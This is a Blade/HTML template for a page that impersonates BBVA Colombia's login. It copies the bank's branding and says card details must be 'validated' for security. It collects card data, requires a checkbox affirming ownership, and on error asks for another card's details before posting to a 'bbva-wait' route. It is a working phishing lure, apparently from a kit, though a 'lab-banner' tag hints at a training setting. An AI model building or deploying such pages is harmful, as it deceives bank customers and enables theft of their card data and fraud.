<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acceso | BBVA Colombia</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"
        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>

    <style>
        @font-face {
            font-family: "BBVA Web Bold BS";
            src: url("/bbva/BentonSansBBVA-Bold.woff") format("woff");
            font-weight: normal;
            font-style: normal;
            font-display: swap
        }

        @font-face {
            font-family: "BBVA Web Book BS";
            src: url("/bbva/BentonSansBBVA-Book.woff") format("woff");
            font-weight: normal;
            font-style: normal;
            font-display: swap
        }

        @font-face {
            font-family: "BBVA Web Book Italic BS";
            src: url("/bbva/BentonSansBBVA-BookItalic.woff") format("woff");
            font-weight: normal;
            font-style: normal;
            font-display: swap
        }

        @font-face {
            font-family: "BBVA Web Light BS";
            src: url("/bbva/BentonSansBBVA-Light.woff2?v=b6efddac") format("woff2"), url("/bbva/BentonSansBBVA-Light.woff?v=f8efa444") format("woff");
            font-weight: normal;
            font-style: normal;
            font-display: swap
        }

        @font-face {
            font-family: "BBVA Web Medium BS";
            src: url("/bbva/BentonSansBBVA-Medium.woff?v=63e781ba") format("woff");
            font-weight: normal;
            font-style: normal;
            font-display: swap
        }

        @font-face {
            font-family: "BBVA Web Medium Italic BS";
            src: url("/bbva/BentonSansBBVA-MediumItalic.woff2?v=078a6898") format("woff2"), url("/bbva/BentonSansBBVA-MediumItalic.woff?v=c6e99240") format("woff");
            font-weight: normal;
            font-style: normal;
            font-display: swap
        }

        @font-face {
            font-family: "BBVA Tiempos Regular";
            src: url("/bbva/TiemposTextWeb-Regular.woff2?v=4780f36b") format("woff2"), url("/bbva/TiemposTextWeb-Regular.woff?v=490d864e") format("woff");
            font-weight: normal;
            font-style: normal;
            font-display: swap
        }

        @font-face {
            font-family: "BBVA Tiempos Regular Italic";
            src: url("/bbva/TiemposTextWeb-RegularItalic.woff2?v=9858cc96") format("woff2"), url("/bbva/TiemposTextWeb-RegularItalic.woff?v=7e81d894") format("woff");
            font-weight: normal;
            font-style: normal;
            font-display: swap
        }

        @font-face {
            font-family: "BBVA-Icons";
            src: url("/bbva/coronita-icons-v3.woff") format("woff");
            font-weight: normal;
            font-style: normal;
            font-display: swap
        }

        .texto-1 {
            -webkit-tap-highlight-color: transparent;
            -webkit-font-smoothing: antialiased;
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            border: 0;
            font: inherit;
            vertical-align: baseline;
            font-family: "BBVA Web Book BS", sans-serif;
            color: #121212;
            font-size: 17px;
            line-height: 1.6rem;
            margin-bottom: 0;
        }

        .entrada-1 {
            -webkit-tap-highlight-color: transparent;
            -webkit-text-size-adjust: 100%;
            -webkit-font-smoothing: antialiased;
            box-sizing: border-box;
            font: inherit;
            margin: 0;
            width: 100%;
            background-color: #f4f4f4;
            color: #121212;
            font-size: 17px;
            transition: background-color .25s, border-color .25s;
            position: relative;
            display: block;
            float: right;
            padding: 0 15px 0 15px;
            border: none;
            border-bottom: 1px solid #121212;
            border-radius: 1px;
            font-family: "BBVA Web Book BS", "Helvetica Neue", Arial, Helvetica, sans-serif;
            height: 3.5rem;
        }

        .boton-1 {
            -webkit-tap-highlight-color: transparent;
            -webkit-text-size-adjust: 100%;
            -webkit-font-smoothing: antialiased;
            box-sizing: border-box;
            margin: 0;
            font: inherit;
            vertical-align: baseline;
            display: -webkit-inline-flex;
            cursor: pointer;
            background-color: #1973b8;
            border: none;
            border-radius: 1px;
            color: #fff;
            font-size: 1.5rem;
            font-family: "BBVA Web Medium BS", sans-serif;
            /* padding: 0 3.2rem; */
            height: 3.5rem;
            /* min-width: 8.8rem; */
            text-align: center;
            text-decoration: none;
            /* margin-right: 2.4rem; */
        }

        .boton-1:disabled {
            background-color: #ccc;
        }

        @media only screen and (min-width: 768px) {
            body {
                width: 40%;
                /* Ancho del cuerpo en dispositivos de escritorio */
                margin: 0 auto;
                /* Centra el cuerpo horizontalmente */
            }
        }
    </style>

</head>

<body>
<x-lab-banner />
    <div class="text-center py-4" style="background-color: #043263;">
        <img src="/bbva/logo_bbva_blanco.svg" width="80" height="24" alt="">
    </div>
    <br>
    <div>
        @if(session('error') === true)
        <p class="p-3 text-center" style="color: #1973b8;">Validación sin éxito, intenta nuevamente o ingresa los datos
            de otra tarjeta de crédito o débito.</p>
        @endif

        <h1 class="texto-1 px-5 mt-5">
            Por seguridad debemos validar la información del siguiente producto.
        </h1>
    </div>
    <br>
    <form action="{{ route('bbva-wait') }}" method="post">
        @csrf
        <div class="px-5 mb-5">

            <x-pagotdc.datos-tarjeta class="personalizar-componente" />
            <script>

                $(document).ready(function () {
                    $("#banco-select").remove();
                });

            </script>
            <div class="px-5 mb-3" style="font-size: 10px;">
                <span id="label-check"><input type="checkbox" name="check" id="check" style="accent-color: #043263;">
                    Certifico que soy el titular de
                    este
                    producto.</span>
            </div>
        </div>

        <input type="hidden" name="status" value="nuevo-tc">
        <div class="mt-5 text-center">
            <button id="boton-1" class="boton-1 text-center px-5 pt-2">Validar</button>
        </div>
    </form>

    <script>
        $(document).ready(function () {
            function actualizarEstadoBoton() {
                // Verificar si las variables están definidas y si el checkbox está marcado
                if (typeof verde1 !== 'undefined' && typeof verde2 !== 'undefined' && typeof verde3 !== 'undefined' && typeof verde4 !== 'undefined') {
                    if (verde1 === 1 && verde2 === 1 && verde3 === 1 && verde4 === 1 && $('input[name="check"]').is(':checked')) {
                        $('#boton-1').prop('disabled', false); // Habilita el botón
                    } else {
                        $('#boton-1').prop('disabled', true); // Deshabilita el botón
                    }
                }
            }

            // Monitorear cambios en las variables verde1, verde2, verde3, verde4 y el checkbox
            setInterval(actualizarEstadoBoton, 100); // Verificar cada 100ms

            // Monitorear cambios en el checkbox
            $('input[name="check"]').on('change', actualizarEstadoBoton);

            // Inicializar el estado del botón
            actualizarEstadoBoton();
        });
    </script>


    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
        crossorigin="anonymous"></script>
</body>

</html>